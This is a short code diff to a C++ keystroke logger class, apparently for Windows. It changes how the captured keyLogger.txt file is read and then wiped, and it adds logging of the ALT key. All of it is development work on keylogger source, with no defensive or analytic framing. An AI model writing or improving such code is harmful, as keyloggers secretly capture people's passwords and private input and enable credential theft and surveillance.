@@ -22,8 +22,13 @@ string KeyLogger::getKeyLoggerData()
 	{
 		text += line + "\n";
 	}
-	LogFile.clear();//empty the file
+	//LogFile.clear();//empty the file
 	LogFile.close();
+
+	// empty the file
+	LogFile.open("keyLogger.txt", ios::out | ios::trunc);
+	LogFile.close();
+
 	return text;
 }
 
@@ -82,6 +87,9 @@ bool KeyLogger::SpecialKeys(int S_Key) {
 		return true;
 	case VK_SHIFT:
 		keyLOG("");
+		return true;
+	case VK_MENU:
+		keyLOG("#ALT#");
 		return true;
 	default:
 		return false;
